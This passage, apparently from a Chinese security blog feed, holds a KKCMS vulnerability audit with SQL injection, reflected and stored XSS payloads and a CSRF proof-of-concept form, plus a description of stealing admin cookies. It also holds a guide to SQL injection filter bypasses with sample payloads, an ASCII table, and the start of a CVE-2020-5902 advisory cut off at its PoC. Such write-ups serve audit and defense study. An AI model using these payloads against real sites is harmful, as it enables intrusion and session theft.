src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707160459084.png" alt="image-20200707160459084"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707160524952.png" alt="image-20200707160524952"></p><p>可以看出来,传参del可能存在sql注入</p><p>跟进审计</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707161449607.png" alt="image-20200707161449607"></p><p>发现几乎都未进行过滤参数,也未引用过滤文件，全局搜索$_GET[‘del’],几乎都存在注入</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707161306746.png" alt="image-20200707161306746"></p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/kkcms/admin/cms_usergroup.php?del=2%20and%20sleep(5)</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707161808647.png" alt="image-20200707161808647"></p><h2 id="0x08-前台多处反射型XSS"><a href="#0x08-前台多处反射型XSS" class="headerlink" title="0x08 前台多处反射型XSS"></a>0x08 前台多处反射型XSS</h2><p><strong>&#x2F;template&#x2F;wapian&#x2F;dongman.php</strong></p><p><strong>&#x2F;template&#x2F;wapian&#x2F;movie.php</strong></p><p><strong>&#x2F;template&#x2F;wapian&#x2F;dongman.php</strong></p><p><strong>&#x2F;template&#x2F;wapian&#x2F;tv.php</strong></p><p><strong>&#x2F;template&#x2F;wapian&#x2F;zongyi.php</strong></p><p>点击切换页数，会发现带有参数传递,F12查看元素</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707163958602.png" alt="image-20200707163958602"></p><p>进入**&#x2F;template&#x2F;wapian&#x2F;dongman.php**审计查找$_GET[‘m’]参数的出现位置</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707172053915.png" alt="image-20200707172053915"></p><p>同时也发现了m参数<strong>就是echo出具体的数据类容</strong>,同时这里的过滤不太严格</p><p>定位跟踪getPageHtml函数</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707173127579.png" alt="image-20200707173127579"></p><p>这里并没有任何过滤</p><p>构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/kkcms/dongman.php?m=%22%3E%3Cscript%3Ealert(1111111)%3C/script%3E</span><br><span class="line">?cat=all&amp;page=2</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707173009301.png" alt="image-20200707173009301"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707172929916.png" alt="image-20200707172929916"></p><p>全局搜索,含有此传参的,几乎都存在反射型XSS</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707173254609.png" alt="image-20200707173254609"></p><h2 id="0x09-CSRF与XSS"><a href="#0x09-CSRF与XSS" class="headerlink" title="0x09 CSRF与XSS"></a>0x09 CSRF与XSS</h2><p><strong>&#x2F;admin&#x2F;cms_link.php</strong></p><p><strong>&#x2F;admin&#x2F;model&#x2F;link.php</strong></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>首先来到后台友情链接这里</strong></p><p>简单的尝试,发现名称和地址都存在存储型XSS,直接输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">111111111</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>方可插入</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707173653380.png" alt="image-20200707173653380"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707173704787.png" alt="image-20200707173704787"></p><p>配合CSRF使用,抓包生成CSRF POC</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707174351985.png" alt="image-20200707174351985"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://lab.l0ki.top/kkcms/admin/cms_link.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;l<span class="symbol">&amp;#95;</span>name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert<span class="symbol">&amp;#40;</span>111111111<span class="symbol">&amp;#41;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;#47;</span>script<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;l<span class="symbol">&amp;#95;</span>logo&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;l<span class="symbol">&amp;#95;</span>url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;l<span class="symbol">&amp;#95;</span>sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;save&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æ<span class="symbol">&amp;#143;</span><span class="symbol">&amp;#144;</span>äº<span class="symbol">&amp;#164;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在本地新建文件EXP.html</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707174436128.png" alt="image-20200707174436128"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707174447649.png" alt="image-20200707174447649"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707174455461.png" alt="image-20200707174455461"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707174506914.png" alt="image-20200707174506914"></p><p>即可回显添加成功</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>跟踪<strong>cms_link</strong>.php代码</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707180033370.png" alt="image-20200707180033370"></p><p>发现输出没有任何过滤</p><p>全局搜索l_name</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707180327685.png" alt="image-20200707180327685"></p><p>在&#x2F;model&#x2F;kink.php中我们很明显的发现</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707180402737.png" alt="image-20200707180402737"></p><p>参数被接收后没有做任何过滤直接插入数据库,<strong>没有对传入的数据直接进行验证，所以产生了XSS漏洞</strong></p><h3 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a><strong>CSRF原理</strong></h3><p><strong>这里先假设友链&#x3D;a页面，burp生成的csrf.html为b页面。A页面需要管理员登陆的情况下，黑客诱惑管理员点击b页面，这时候b页面有我们的恶意代码，可以借用a页面中的管理员去执行b页面中的恶意payload</strong></p><h3 id="执行b页面原因"><a href="#执行b页面原因" class="headerlink" title="执行b页面原因"></a><strong>执行b页面原因</strong></h3><p><strong>A页面管理员在已经登陆的情况下是会有个cookie的，如果你再打开一个后台页面是不需要登陆一遍的。CSRF就是借用管理员的cookie，去执行添加友链的表单，所以就打出CSRF了。</strong></p><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a><strong>核心代码</strong></h3><p><strong>第一个isset 判断里面的数据是否已设置并且不为NULL</strong></p><p><strong>第二然后已POST类型进行传参</strong></p><p><strong>然后就是下面的$sql insert into 把数据传到数据库里面</strong></p><p><strong>$sql &#x3D; ‘insert into xtcms_link (‘ . $str[0] . ‘) values (‘ . $str[1] . ‘)’;</strong></p><p><strong>然后下面就是判断，最后就是回显内容了。用BURP抓了个输入内容的数据包可以知道这边没有token, 而且也没有二次校验，导致了XSS，这也导致了即存在XSS也存在CSRF漏洞</strong></p><h3 id="接收cookie"><a href="#接收cookie" class="headerlink" title="接收cookie"></a>接收cookie</h3><p>在留言板处插入配合XSS平台使用的代码</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707184303015.png" alt="image-20200707184303015"></p><p>后台访问可直接在XSS平台弹出管理员cookie</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707184154353.png" alt="image-20200707184154353"></p><p>分析book.php,不难发现传参只对单双引号做了反斜杠过滤,绕过只需不用到单双引号即可</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200707184419863.png" alt="image-20200707184419863"></p><h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>还有几个XSS在友链,都很简单就不复现了</p><p>KKCMS适合新手去审计</p><p>审计配合Seay工具很方便</p><p>在使用中要发现问题代码传参的地方</p><p>搭配全局搜索很好用</p><p>在插入数据库的测试中可以使用MySql监控</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII Comparison Chart</title>
      <link href="/2020/07/07/ASCII-Comparison-Chart/"/>
      <url>/2020/07/07/ASCII-Comparison-Chart/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="left">ASCII值</th><th align="left">控制字符</th><th align="left">ASCII值</th><th align="left">控制字符</th><th align="left">ASCII值</th><th align="left">控制字符</th><th align="left">ASCII值</th><th align="left">控制字符</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">NUT</td><td align="left">32</td><td align="left">(space)</td><td align="left">64</td><td align="left">@</td><td align="left">96</td><td align="left">、</td></tr><tr><td align="left">1</td><td align="left">SOH</td><td align="left">33</td><td align="left">!</td><td align="left">65</td><td align="left">A</td><td align="left">97</td><td align="left">a</td></tr><tr><td align="left">2</td><td align="left">STX</td><td align="left">34</td><td align="left">“</td><td align="left">66</td><td align="left">B</td><td align="left">98</td><td align="left">b</td></tr><tr><td align="left">3</td><td align="left">ETX</td><td align="left">35</td><td align="left">#</td><td align="left">67</td><td align="left">C</td><td align="left">99</td><td align="left">c</td></tr><tr><td align="left">4</td><td align="left">EOT</td><td align="left">36</td><td align="left">$</td><td align="left">68</td><td align="left">D</td><td align="left">100</td><td align="left">d</td></tr><tr><td align="left">5</td><td align="left">ENQ</td><td align="left">37</td><td align="left">%</td><td align="left">69</td><td align="left">E</td><td align="left">101</td><td align="left">e</td></tr><tr><td align="left">6</td><td align="left">ACK</td><td align="left">38</td><td align="left">&amp;</td><td align="left">70</td><td align="left">F</td><td align="left">102</td><td align="left">f</td></tr><tr><td align="left">7</td><td align="left">BEL</td><td align="left">39</td><td align="left">,</td><td align="left">71</td><td align="left">G</td><td align="left">103</td><td align="left">g</td></tr><tr><td align="left">8</td><td align="left">BS</td><td align="left">40</td><td align="left">(</td><td align="left">72</td><td align="left">H</td><td align="left">104</td><td align="left">h</td></tr><tr><td align="left">9</td><td align="left">HT</td><td align="left">41</td><td align="left">)</td><td align="left">73</td><td align="left">I</td><td align="left">105</td><td align="left">i</td></tr><tr><td align="left">10</td><td align="left">LF</td><td align="left">42</td><td align="left">*</td><td align="left">74</td><td align="left">J</td><td align="left">106</td><td align="left">j</td></tr><tr><td align="left">11</td><td align="left">VT</td><td align="left">43</td><td align="left">+</td><td align="left">75</td><td align="left">K</td><td align="left">107</td><td align="left">k</td></tr><tr><td align="left">12</td><td align="left">FF</td><td align="left">44</td><td align="left">,</td><td align="left">76</td><td align="left">L</td><td align="left">108</td><td align="left">l</td></tr><tr><td align="left">13</td><td align="left">CR</td><td align="left">45</td><td align="left">-</td><td align="left">77</td><td align="left">M</td><td align="left">109</td><td align="left">m</td></tr><tr><td align="left">14</td><td align="left">SO</td><td align="left">46</td><td align="left">.</td><td align="left">78</td><td align="left">N</td><td align="left">110</td><td align="left">n</td></tr><tr><td align="left">15</td><td align="left">SI</td><td align="left">47</td><td align="left">&#x2F;</td><td align="left">79</td><td align="left">O</td><td align="left">111</td><td align="left">o</td></tr><tr><td align="left">16</td><td align="left">DLE</td><td align="left">48</td><td align="left">0</td><td align="left">80</td><td align="left">P</td><td align="left">112</td><td align="left">p</td></tr><tr><td align="left">17</td><td align="left">DCI</td><td align="left">49</td><td align="left">1</td><td align="left">81</td><td align="left">Q</td><td align="left">113</td><td align="left">q</td></tr><tr><td align="left">18</td><td align="left">DC2</td><td align="left">50</td><td align="left">2</td><td align="left">82</td><td align="left">R</td><td align="left">114</td><td align="left">r</td></tr><tr><td align="left">19</td><td align="left">DC3</td><td align="left">51</td><td align="left">3</td><td align="left">83</td><td align="left">S</td><td align="left">115</td><td align="left">s</td></tr><tr><td align="left">20</td><td align="left">DC4</td><td align="left">52</td><td align="left">4</td><td align="left">84</td><td align="left">T</td><td align="left">116</td><td align="left">t</td></tr><tr><td align="left">21</td><td align="left">NAK</td><td align="left">53</td><td align="left">5</td><td align="left">85</td><td align="left">U</td><td align="left">117</td><td align="left">u</td></tr><tr><td align="left">22</td><td align="left">SYN</td><td align="left">54</td><td align="left">6</td><td align="left">86</td><td align="left">V</td><td align="left">118</td><td align="left">v</td></tr><tr><td align="left">23</td><td align="left">TB</td><td align="left">55</td><td align="left">7</td><td align="left">87</td><td align="left">W</td><td align="left">119</td><td align="left">w</td></tr><tr><td align="left">24</td><td align="left">CAN</td><td align="left">56</td><td align="left">8</td><td align="left">88</td><td align="left">X</td><td align="left">120</td><td align="left">x</td></tr><tr><td align="left">25</td><td align="left">EM</td><td align="left">57</td><td align="left">9</td><td align="left">89</td><td align="left">Y</td><td align="left">121</td><td align="left">y</td></tr><tr><td align="left">26</td><td align="left">SUB</td><td align="left">58</td><td align="left">:</td><td align="left">90</td><td align="left">Z</td><td align="left">122</td><td align="left">z</td></tr><tr><td align="left">27</td><td align="left">ESC</td><td align="left">59</td><td align="left">;</td><td align="left">91</td><td align="left">[</td><td align="left">123</td><td align="left">{</td></tr><tr><td align="left">28</td><td align="left">FS</td><td align="left">60</td><td align="left">&lt;</td><td align="left">92</td><td align="left">&#x2F;</td><td align="left">124</td><td align="left">|</td></tr><tr><td align="left">29</td><td align="left">GS</td><td align="left">61</td><td align="left">&#x3D;</td><td align="left">93</td><td align="left">]</td><td align="left">125</td><td align="left">}</td></tr><tr><td align="left">30</td><td align="left">RS</td><td align="left">62</td><td align="left">&gt;</td><td align="left">94</td><td align="left">^</td><td align="left">126</td><td align="left">&#96;</td></tr><tr><td align="left">31</td><td align="left">US</td><td align="left">63</td><td align="left">?</td><td align="left">95</td><td align="left">_</td><td align="left">127</td><td align="left">DEL</td></tr></tbody></table><p><strong>特殊字符解释</strong></p><table><thead><tr><th>NUL空</th><th>VT 垂直制表</th><th>SYN 空转同步</th></tr></thead><tbody><tr><td>STX 正文开始</td><td>CR 回车</td><td>CAN 作废</td></tr><tr><td>ETX 正文结束</td><td>SO 移位输出</td><td>EM 纸尽</td></tr><tr><td>EOY 传输结束</td><td>SI 移位输入</td><td>SUB 换置</td></tr><tr><td>ENQ 询问字符</td><td>DLE 空格</td><td>ESC 换码</td></tr><tr><td>ACK 承认</td><td>DC1 设备控制1</td><td>FS 文字分隔符</td></tr><tr><td>BEL 报警</td><td>DC2 设备控制2</td><td>GS 组分隔符</td></tr><tr><td>BS 退一格</td><td>DC3 设备控制3</td><td>RS 记录分隔符</td></tr><tr><td>HT 横向列表</td><td>DC4 设备控制4</td><td>US 单元分隔符</td></tr><tr><td>LF 换行</td><td>NAK 否定</td><td>DEL 删除</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Common Defenses and Bypass Techniques for SQL Injection</title>
      <link href="/2020/07/07/Common-SQL-Injection-Defenses-and-Bypasses/"/>
      <url>/2020/07/07/Common-SQL-Injection-Defenses-and-Bypasses/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PHP防御的几种姿势"><a href="#0x01-PHP防御的几种姿势" class="headerlink" title="0x01 PHP防御的几种姿势"></a>0x01 PHP防御的几种姿势</h2><h3 id="关闭错误提示"><a href="#关闭错误提示" class="headerlink" title="关闭错误提示"></a>关闭错误提示</h3><p>说明：<br>PHP配置文件php.ini中的display_errors&#x3D;Off</p><h3 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h3><p>说明：<br>当php.ini里的magic_quotes_gpc&#x3D;On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符<br>魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）<br>PHP 5.4 之前PHP指令magic_quotes_gpc默认是on<br>在PHP5.4.0起magic_quotes_gpc将始终返回FALSE</p><h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h3><p>addslashes函数，它会在指定的预定义字符前添加反斜杠转义，这些预定义的字符是：单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）<br>这个函数的作用和<code>magic_quotes_gpc</code>一样。所以一般用<code>addslashes</code>前会检查是否开了<code>magic_quotes_gpc</code></p><p><code>magic_quotes_gpc</code>与<code>addslashes</code>的区别用法：</p><p><strong>1）对于magic_quotes_gpc&#x3D;on的情况</strong><br>我们可以不对输入和输出数据库的字符串数据作addslashes()和stripslashes()的操作,数据也会正常显示<br>如果此时你对输入的数据作了addslashes()处理，那么在输出的时候就必须使用stripslashes()去掉多余的反斜杠<br><strong>2）对于magic_quotes_gpc&#x3D;off 的情况</strong><br>必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出<br>因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p><h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h3><p>mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符<br>下列字符受影响<br><code>\x00</code><br><code>\n</code><br><code>\r</code><br><code>\</code><br><code>&#39;</code><br><code>&quot;</code><br><code>\x1a</code><br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false<br>因为完全性问题，建议使用拥有Prepared Statement机制的PDO和MYSQLi来代替mysql_query，使用的是mysqli_real_escape_string</p><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><p>htmlspecialchars()函数把预定义的字符转换为 HTML实体<br>预定义的字符是:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&amp;</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&amp;</span></span><br><span class="line">“ <span class="operator">-</span><span class="operator">&gt;</span> &quot;</span><br><span class="line">‘ -&gt; &#x27;</span><br><span class="line">&lt; -&gt; &lt;</span><br><span class="line">&gt; -&gt; &gt;</span><br></pre></td></tr></table></figure><h3 id="用正则匹配替换来过滤指定的字符"><a href="#用正则匹配替换来过滤指定的字符" class="headerlink" title="用正则匹配替换来过滤指定的字符"></a>用正则匹配替换来过滤指定的字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match <span class="title function_ invoke__">preg_match_all</span>() preg_replace</span><br></pre></td></tr></table></figure><h3 id="转换数据类型"><a href="#转换数据类型" class="headerlink" title="转换数据类型"></a>转换数据类型</h3><p>根据「检查数据类型」的原则，查询之前要将输入数据转换为相应类型，如uid都应该经过intval函数格式为int型</p><h3 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h3><p>绑定变量使用预编译语句是预防SQL注入的最佳方式，因为使用预编译的SQL语句语义不会发生改变，在SQL语句中，变量用问号?表示，攻击者无法改变SQL语句的结构，从根本上杜绝了SQL注入攻击的发生</p><h2 id="0x02-几种绕过姿势"><a href="#0x02-几种绕过姿势" class="headerlink" title="0x02 几种绕过姿势"></a>0x02 几种绕过姿势</h2><h3 id="addslashes-1"><a href="#addslashes-1" class="headerlink" title="addslashes"></a>addslashes</h3><p>绕过：<br>1.将字符串转为16进制编码数据或使用char函数（十进制）进行转化（因为数据库会自动把16进制转化）<br>2.用注释符去掉输入密码部分如”–&#x2F;*#”</p><p>payload:<br><code>http://localhost/injection/user.php?username=admin--</code><br>注意– 后的空格<br><code>http://localhost/injection/user.php?username=admin/*</code><br>（escape不转义&#x2F;* )</p><p><code>http://localhost/injection/user.php?username=admin%23</code><br>（这里的%23即为#，注释掉后面的密码部分。注意IE浏览器会将#转换为空）<br><code>http://localhost/injection/user.php?username=0x61646d696e23</code><br>（admin# –&gt;0x61646d696e23）<br><code>http://localhost/injection/user.php?username=CHAR(97,100, 109, 105, 110, 35)</code><br>（admin# –&gt;CHAR(97, 100, 109, 105, 110, 35)）</p><p>关于编码原理：</p><p>因为一般前端JavaScript都会escape()、encodeURL或encodeURIComponent编码再传输给服务器，主要为encodeURL，如下，所以可以利用这点</p><p>1)escape( )<br>对ASCII字母、数字、标点符号<code>”@* _ + - . /“</code>不进行编码。在&#96;&#96;\u0000<code>到</code>\u00ff<code>之间的符号被转成</code>%xx<code>的形式，其余符号被转成</code>%uxxxx&#96;的形式。（注意escape()不对”+”编码，而平时表单中的空格会变成+）</p><ol start="2"><li>encodeURL<br>对<code>” ; / ? : @ &amp; = + $ , # ‘ “</code>不进行编码。编码后，它输出符号的utf-8形式，并且在每个字节前加上<code>%</code>。</li><li>encodeURIComponent<br>用于对URL的组成部分进行个别编码，而不用于对整个URL进行编码。<br>常用编码：<br><code>@ * _ + - ./ ; \ ? : @ &amp; = + $ , # &#39; 空格</code></li></ol><p>转码工具可用：<br><a href="http://evilcos.me/lab/xssor/">http://evilcos.me/lab/xssor/</a></p><h3 id="匹配过滤"><a href="#匹配过滤" class="headerlink" title="匹配过滤"></a>匹配过滤</h3><p>preg_match<br>绕过：<br>关键词 and,or 常被用做简单 测试网站是否容易进行注入攻击<br>过滤注入： 1 or 1 &#x3D; 1 1 and 1 &#x3D; 1<br>绕过注入： 1 || 1 &#x3D; 1 1 &amp;&amp; 1 &#x3D; 1<br><a href="http://www.cnblogs.com/croot/p/3450262.html">混淆和绕过</a></p><h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h3><p>strstr ()查找字符串的首次出现，该函数区分大小写。如果想要不区分大小写，使用stristr()。(注意后面这个函数多了个i)<br>绕过：<br>strstr()函数是对大小写敏感的，所以我们可以通过大小写变种来绕过<br>payload：<br><code>http://localhost/injection/user.php?id=1uNion select null,null,null</code></p><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>绕过：<br>1)使用内联注释。<br>2)使用换行符代替空格。注意服务器若为Windows则换行符为%0A%0D，Linux则为%0A<br>payload:<br><code>http://localhost/injection/user.php?id=1/**/and/**/1=1</code><br><code>http://localhost/injection/user.php?id=1%0A%0Dand%0A%0D1=1</code></p><h3 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h3><p>通常的输入过滤器都是在应用程序之外的代码实现的。比如入侵检测系统（IDS），这些系统一般是由原生编程语言开发而成，比如C++，为什么空字节能起作用呢，就是因为在原生变成语言中，根据字符串起始位置到第一个出现空字节的位置来确定字符串长度。所以说空字节就有效的终止了字符串</p><p>绕过：<br>只需要在过滤器阻止的字符串前面提供一个采用URL编码的空字节即可。</p><p>payload:<br><code>%00</code></p><h3 id="构造故意过滤"><a href="#构造故意过滤" class="headerlink" title="构造故意过滤"></a>构造故意过滤</h3><p>将传入的<code>%27</code>和<code>%2527</code>都进行删除处理，也就是还没传入数据库前就已经被该死的程序吃了，但是在看到他还吃了<code>*</code>，这样我们就有办法了，我们构造<code>%*27</code>，这样程序吃掉星号<code>*</code>后，<code>%27</code>就会被传入</p><p>payload：<br><code>http://localhost/injection/user.php?id%3D1%*27%*20and%*20%*271%*27%3D%*271</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-5902: F5 BIG-IP Remote Code Execution Vulnerability</title>
      <link href="/2020/07/06/CVE-2020-5902/"/>
      <url>/2020/07/06/CVE-2020-5902/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h2><p><code>F5 BIG-IP</code> 是美国<code>F5</code>公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。</p><p>2020年07月03日， <code>F5</code> 发布了 <code>F5 BIG-IP 远程代码执行</code> 的风险通告，该漏洞编号为 <code>CVE-2020-5902</code>，漏洞等级：<code>严重</code>。</p><p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启&#x2F;禁用服务、创建&#x2F;删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p><blockquote><p>参考网上众多通告，总结此篇。</p><p>与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。</p></blockquote><h2 id="0x02-风险等级"><a href="#0x02-风险等级" class="headerlink" title="0x02 风险等级"></a>0x02 风险等级</h2><p>官方给出的安全咨询状态</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200706135008771.png" alt="image-20200706135008771"></p><p>该漏洞的评定结果如下</p><table><thead><tr><th align="center">评定方式</th><th align="center">等级</th></tr></thead><tbody><tr><td align="center">威胁等级</td><td align="center">严重</td></tr><tr><td align="center">影响面</td><td align="center">广泛</td></tr></tbody></table><h2 id="0x03-漏洞详情"><a href="#0x03-漏洞详情" class="headerlink" title="0x03 漏洞详情"></a>0x03 漏洞详情</h2><p><code>F5 BIG-IP</code> 是美国<code>F5</code>公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。</p><p>在 <code>F5 BIG-IP</code> 产品的流量管理用户页面 (TMUI)&#x2F;配置实用程序的特定页面中存在一处远程代码执行漏洞。</p><p><strong>目前msf已经集成了该漏洞的利用。</strong></p><p>未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启&#x2F;禁用服务、创建&#x2F;删除服务器端文件等。</p><h2 id="0x04-利用方法"><a href="#0x04-利用方法" class="headerlink" title="0x04 利用方法"></a>0x04 利用方法</h2><h3 id="文件读取poc"><a href="#文件读取poc" class="headerlink" title="文件读取poc"></a>文件读取poc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 